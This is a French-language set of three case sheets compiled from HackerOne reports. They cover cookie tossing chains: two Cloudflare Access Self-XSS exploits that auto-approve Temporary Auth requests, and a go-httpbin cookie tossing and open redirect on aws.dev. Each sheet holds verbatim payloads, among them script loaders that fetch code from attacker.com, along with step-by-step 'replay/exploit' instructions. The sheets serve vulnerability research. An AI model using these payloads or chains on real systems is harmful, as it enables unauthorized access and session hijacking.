# Fiches SSS — Cookie Injection / Supercookies

*3 cas sélectionnés dans le corpus 2025-2026. Preuves verbatim extraites des fichiers bruts `tools/collector/data/raw/h1/<id>.json` (texte intégral HackerOne, ou résumés d'équipe/chercheur quand le texte intégral est absent) et, pour les rapports Cloudflare #3423950 / #3321406, du writeup complet du chercheur intégré au corpus : `tools/collector/data/raw/pages/kazama/cloudflare-self-xss.txt`.*

---

### [Variation of #3321406] Self-XSS + Cookie Tossing → auto approval in AccessTempAuth

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/3423950)

⚠️ texte intégral indisponible dans `data/raw/h1/3423950.json` (`vulnerability_information` vide) — fiche construite sur les résumés du JSON brut **et le writeup détaillé du chercheur cité par l'équipe, intégré au corpus** (`data/raw/pages/kazama/cloudflare-self-xss.txt`, « Making Self-XSS Great Again: Unauthorized Access Request Approvals in Cloudflare », 6 avril 2026).

Deuxième temps de la saga Cloudflare Access : après la correction du Self-XSS SAML (#3321406), le chercheur découvre un second Self-XSS — cette fois **stocké** dans le champ email de Browser Isolation — et rejoue la chaîne entière : auto-approbation d'une demande Temporary Auth par un simple clic de la victime, contournant le contrôle d'accès central de Cloudflare Access. Corrigé le 6 janvier 2026, bounty 2 000 $ attribué le 2 avril 2026.

**Cause racine :** les endpoints Browser Isolation sous `*.cloudflareaccess.com/browser` lisent le claim `email` du JWT porté par le cookie `CF_Authorization` et le rendent **sans assainissement** dans une balise `<script>` inline (`var userEmail = '<injection>'`), ce qui permet de fermer le littéal et d'injecter du HTML/JS. Deux verrous sont contournés : la validation de format d'email (bypass par quoted-string RFC 5321) et le passage en minuscules imposé par `/browser` (payload découpé en 3 stages). La fin de chaîne est identique à #3321406 : cookie tossing `CF_Session` + `csrf_token` dérivé de manière déterministe → POST d'auto-approbation.

**Preuve technique (verbatim) :**

Résumés du JSON brut H1 :

```
We have resolved an issue in Cloudflare Access where an exploit chain involving the Browser Isolation email field could allow for unauthorized approvals within the Temporary Auth workflow. This has been fully remediated, and we thank the researcher for their help in hardening our authentication flows

Detailed Writeup: https://kazama.in/self-xss-to-cloudflare-single-click-approvals/
```

Writeup du chercheur (source intégrée) :

```
Some of these endpoints pull the user's email directly from the CF_Authorization cookie's JWT email claim – and render it without sanitization. The email was injected inside an inline <script> tag, something like:
var userEmail = '<injection>'
There was one problem: the /browser endpoint lowercases email addresses before rendering them.
This is a Stored Self-XSS: the payload persists in the CF_Authorization Cookie and fires every time the authenticated session loads the Browser Isolation page.
there was an additional hurdle: Cloudflare's email field had format validation that rejected obviously malformed email addresses. I dug into the email RFCs and found that the quoted-string feature allows almost any character inside the local part when wrapped in double quotes.
```

Payload final et URL d'atterrissage (verbatim) :

```
"test'</script><script>eval(unescape(window.location.search.split('=')[0].slice(1)))</script>"@burp-collab-domain.com
https://attackerdomain.cloudflareaccess.com/browser/https://example.com/?document.head.appendChild(Object.assign(document.createElement("script"),{src:"https://attacker.com/js"}))
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : organisation Zero Trust Cloudflare Access contrôlée par l'attaquant ; un domaine Burp Collaborator (ou équivalent) réceptionnant les emails — c'est là que le magic OTP arrive ; une demande Temporary Auth déjà émise par l'attaquant et en attente d'approbation ; une victime approvatrice qui clique sur le lien.
- Étapes (chaîne complète du writeup) : 1. Enregistrer un compte dans l'org attaquante avec l'email payload quoted-string (le domaine est un vrai MTA → l'OTP y est livré). 2. Initier le flux Temporary Auth → demande en attente côté attaquant. 3. Réclamer un OTP, capter le magic link via le Collaborator. 4. Construire l'URL de phishing = magic link + Stage 2 en **clé** de query string (`…/?document.head.appendChild(Object.assign(document.createElement("script"),{src:"https://attacker.com/js"}))`). 5. La victime clique → chaîne de redirections OTP → `CF_Authorization` posé sur `attackerdomain` avec le JWT contenant l'email malveillant (la session `CF_Authorization` de la victime sur `victimdomain` reste intacte, cookie scopé par sous-domaine). 6. La page Browser Isolation rend l'email non assaini → Stage 1 `eval(unescape(window.location.search.split('=')[0].slice(1)))` lit la query (non minculisée) → Stage 2 injecte `<script src="https://attacker.com/js">` → Stage 3 : cookie tossing `CF_Session` + POST cross-origin avec le `csrf_token` pré-calculé. 7. La demande Temporary Auth de l'attaquant est approuvée avant que la victime ne réagisse.
- Pièges / limites : `/browser` minuscule tout → payload Stage 1 strictement lowercase (d'où le `eval(unescape(…))` sur la query) ; l'email doit passer la validation de format tout en embarquant le script (quoted-string RFC 5321, local part entre guillemets) ; Self-XSS **authentifié** (exige un `CF_Authorization` valide) d'où la livraison par magic link OTP ; les faiblesses structurelles (cookie tossing + CSRF déterministe) sont restées après le correctif SAML — seule l'entrée d' XSS a changé.

**Reproductibilité :** moyenne — chaîne complète avec payloads et URL exacts dans le writeup intégré, mais cible corrigée (janvier 2026) et exécution dépendante d'une victime approvatrice cliquant sur le lien.

**Techniques :** stored self-xss, jwt email claim injection, rfc5321 quoted-string email bypass, lowercase constraint staging (eval/unescape), cookie tossing, anti-csrf token prediction, otp magic link delivery, 1-click chain, unauthorized approval

**Correspond aux classes qualifiantes :** xss, csrf, cookie injection, auth bypass

**Signal (endpoints/fonctions observés) :**
- Endpoints `*.cloudflareaccess.com/browser/…` (rendu du claim `email`), `…/cdn-cgi/access/authorized?nonce=&code=&secret=` (OTP magic link), `…/access-request/*` (POST d'approbation)
- Cookies `CF_Authorization` (JWT claim `email`), `CF_Session` (portée `*.cloudflareaccess.com`)
- Stage 1 : `eval(unescape(window.location.search.split('=')[0].slice(1)))` — Stage 2 : `document.createElement("script")` / `https://attacker.com/js`

**Paramètres impliqués :** claim `email` du JWT, `CF_Session`, `csrf_token`, clé de query (Stage 2), `nonce`, `code`, `secret` (OTP)

---

### [Variation of #1554049] Self-XSS + Cookie Tossing → auto approval in Access Temp Auth

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/3321406)

⚠️ texte intégral indisponible dans `data/raw/h1/3321406.json` (`vulnerability_information` vide) — fiche construite sur les résumés du JSON brut **et le writeup complet du chercheur cité par l'équipe, intégré au corpus** (`data/raw/pages/kazama/cloudflare-self-xss.txt`, même article).

Rapport fondateur de la chaîne (soumis le 31 août 2025, trié le 10 septembre, corrigé le 11 novembre 2025, bounty 1 000 $) : trois bugs individuels « informative » — un Self-XSS joignable uniquement par l'attaquant, un cookie tossing sans conséquence, un jeton AntiCSRF prédictible sans vecteur de livraison — enchaînés en une auto-approbation en un clic du workflow Temporary Auth de Cloudflare Access, par un simple lien cliqué par l'approbateur.

**Cause racine :** trois défauts conjugués. 1) Le champ ACS URL de configuration SAML accepte les protocoles non-HTTP : un `javascript:` URI est enregistré puis servi comme `action` d'un formulaire auto-soumis par l'endpoint SSO → exécution de script sur l'origine `*.cloudflareaccess.com` (Self-XSS authentifié sur le sous-domaine de l'attaquant). 2) `CF_Session`, cookie de prévention CSRF scopé `*.cloudflareaccess.com`, se laisse fixer (tossing) depuis un sous-domaine frère vers la victime. 3) Le `csrf_token` est « fixed and static, derived directly from the CF_Session cookie value » : cookie connu ⇒ jeton connu. La livraison se fait par magic link OTP qui n'pose `CF_Authorization` que sur le sous-domaine de l'attaquant, laissant la session d'approbateur de la victime intacte.

**Preuve technique (verbatim) :**

Résumés du JSON brut H1 :

```
We have resolved an issue in Cloudflare Access where an exploit chain involving a SAML endpoint could allow for unauthorized approvals within the Temporary Auth workflow. This has been fully remediated, and we thank the researcher for their help in hardening our authentication flows

Detailed Writeup: https://kazama.in/self-xss-to-cloudflare-single-click-approvals/
```

Writeup du chercheur (source intégrée) :

```
The problem was twofold. First, while registering the SAML app in Cloudflare's dashboard, the ACS URL field accepted non-HTTP protocols – a javascript: URI was happily saved without any validation. Second, when the SSO endpoint at attackerdomain.cloudflareaccess.com/cdn-cgi/access/sso/saml was hit, it rendered an auto-submitting POST form with this ACS URL as the form action.
By setting CF_Session=ZeroTrustIsFun! (or any known value) from the attacker's subdomain, the cookie gets sent on every *.cloudflareaccess.com/access-request/* request, including the victim's approval endpoints.
However, if the cookie value is known, the CSRF token is known. It's entirely deterministic.
The magic link follows a redirect chain through attackerdomain.cloudflareaccess.com/cdn-cgi/access/authorized?nonce=&code=&secret= that sets the CF_Authorization cookie, effectively authenticating the browser session without any user interaction beyond the initial click.
Since CF_Session is now a known value set on victim's browser and the CSRF token is just a hash derived from it, I had already pre-computed the matching csrf_token from my own account beforehand – no guessing needed
Sends a cross-origin POST request from attackerdomain.cloudflareaccess.com to victimdomain.cloudflareaccess.com/access-request/* with the pre-computed CSRF token.
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : organisation Zero Trust Cloudflare Access contrôlée par l'attaquant (SAML app en configuration) ; un domaine hébergeant le payload JS (`https://attacker.com/js`) ; un domaine de phishing dont le sous-domaine est un sous-domaine `cloudflareaccess.com` possédé par l'attaquant ; un approbateur temporaire (admin/manager) qui clique.
- Étapes (chaîne complète du writeup) : 1. Configurer une app SAML dans l'org attaquante avec l'ACS URL = `javascript:document.body.appendChild(Object.assign(document.createElement('script'),{src:'https://attacker.com/js'}))` (le loader évite de reconfigurer l'ACS à chaque itération de recherche). 2. Vérifier que l'endpoint SSO `attackerdomain.cloudflareaccess.com/cdn-cgi/access/sso/saml` rend le formulaire auto-soumis qui déclenche le JS (Self-XSS authentifié : nécessite un `CF_Authorization` sur `attackerdomain`). 3. Pré-calculer le `csrf_token` correspondant à `CF_Session=ZeroTrustIsFun!` depuis son propre compte. 4. Générer un magic link OTP pour le compte de l'attaquant, l'intégrer au lien de phishing. 5. La victime clique : les redirections OTP posent `CF_Authorization` **uniquement** sur `attackerdomain` (session `victimdomain` préservée) → atterrissage sur l'endpoint SSO → payload JS s'exécute. 6. Le JS fait le cookie tossing `CF_Session=ZeroTrustIsFun!` depuis `attackerdomain` (propagation à tous les frères `*.cloudflareaccess.com`). 7. POST cross-origin vers `victimdomain.cloudflareaccess.com/access-request/*` avec le jeton pré-calculé → auto-approbation instantanée de la demande de l'attaquant, qui reste connecté avec des cookies applicatifs valides jusqu'à expiration.
- Pièges / limites : le Self-XSS est authentifié (d'où la livraison OTP, sans interaction au-delà du clic) ; `CF_Session` absent au départ est aléatoire à chaque chargement → le tossing est indispensable pour rendre le jeton prévisible ; effet « the approver can try to cancel the request afterwards, but it's too late » ; défenses devenues inutiles une fois les trois bugs isolément clos comme « informative ».

**Reproductibilité :** moyenne — chaîne complète, payloads et étapes exacts dans le writeup intégré, mais cible corrigée (novembre 2025) et exécution dépendante d'une victime approvatrice cliquant sur le lien.

**Techniques :** self-xss via javascript: uri in saml acs url, auto-submitting form, cookie tossing cf_session, anti-csrf token prediction, otp magic link delivery, cross-subdomain session fixation, 1-click chain, unauthorized approval

**Correspond aux classes qualifiantes :** xss, csrf, cookie injection, auth bypass

**Signal (endpoints/fonctions observés) :**
- `attackerdomain.cloudflareaccess.com/cdn-cgi/access/sso/saml` (SSO SAML auto-soumis, `action` = ACS URL)
- `attackerdomain.cloudflareaccess.com/cdn-cgi/access/authorized?nonce=&code=&secret=` (redirection OTP magic link)
- `*.cloudflareaccess.com/access-request/*` (page et POST d'approbation)
- Cookies `CF_Authorization` (authentification, scopé par sous-domaine), `CF_Session` (anti-CSRF, scopé `*.cloudflareaccess.com`) ; paramètre `csrf_token`

**Paramètres impliqués :** ACS URL (payload `javascript:`), `CF_Session`, `csrf_token`, `nonce`, `code`, `secret` (OTP)

---

### Unauthenticated go-httpbin servers: Cookie Tossing on *.aws.dev and Open Redirect

**📄 Cas réel**
sévérité : medium · [source](https://hackerone.com/reports/3966599)

Des instances go-httpbin non authentifiées exposent des endpoints qui acceptent des entrées attaquantes sans validation : `/cookies/set` permet de poser un cookie avec un `Domain` arbitraire, dont le domaine parent `aws.dev`, et `/redirect-to` redirige vers n'importe quelle URL. Des cookies contrôlés par l'attaquant, posés depuis un hôte `*.aws.dev`, sont ainsi envoyés à des applications sœurs sans rapport (cookie tossing), avec un impact DoS constaté : une valeur de cookie forgée déclenche un 403 CloudFront/WAF pour une application distincte. Risques complémentaires : cookie shadowing des cookies applicatifs ou de sécurité, et open redirect depuis une URL de confiance `aws.dev`.

**Cause racine :** une instance go-httpbin est déployée sans authentification sur le domaine parent partagé `aws.dev` ; ses endpoints permettent par conception de définir un cookie avec un `Domain` arbitraire (y compris le parent) et de rediriger vers une URL arbitraire, sans restriction.

**Preuve technique (verbatim depuis la source) :**

```
$ curl -s ████████redirect-to?url=http://google.com -D - -o /dev/null
HTTP/1.1 302 Found
…
Location: http://google.com

████████cookies/set?dos_poc=<script>alert(1)</script>&attr[Domain]=aws.dev

3. As impact, observe the cookie set by `████████` on `aws.dev`, triggers a WAF denial (on a single user) on `████████`
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : aucun compte ; identifier une instance go-httpbin non authentifiée sur un hôte `*.aws.dev` (tous les hôtes sont masqués `████████` dans la source) ; un navigateur pour le cookie tossing.
- Étapes : 1. Naviguer vers l'application visée pour observer son comportement normal (401 avec invite de login). 2. Charger l'URL vulnérable `/cookies/set?dos_poc=<script>alert(1)</script>&attr[Domain]=aws.dev` pour poser le cookie `dos_poc` sur le domaine `aws.dev`. 3. Constater qu'une application sœur sur `*.aws.dev` reçoit le cookie et renvoie un refus WAF. 4. Open redirect : `curl -s .../redirect-to?url=http://google.com -D - -o /dev/null` → `HTTP/1.1 302 Found` et `Location: http://google.com`.
- Pièges / limites : l'hôte vulnérable est masqué ; le DoS observé est « on a single user » ; le cookie de démonstration a une valeur type XSS mais l'impact démontré est le blocage WAF, pas une exécution de script.

**Reproductibilité :** moyenne — endpoints et payloads exacts fournis, aucun compte requis, mais l'hôte vulnérable est masqué dans la source.

**Techniques :** cross-subdomain cookie tossing, cookie injection via httpbin, parent domain cookie, open redirect, waf denial of service, cookie shadowing

**Correspond aux classes qualifiantes :** open redirect, cookie injection, dos

**Signal (endpoints/fonctions observés) :**
- `GET /cookies/set?…&attr[Domain]=aws.dev`
- `GET /redirect-to?url=…`
- Instance go-httpbin non authentifiée sur `*.aws.dev`

**Paramètres impliqués :** `dos_poc`, `attr[Domain]`, `url`
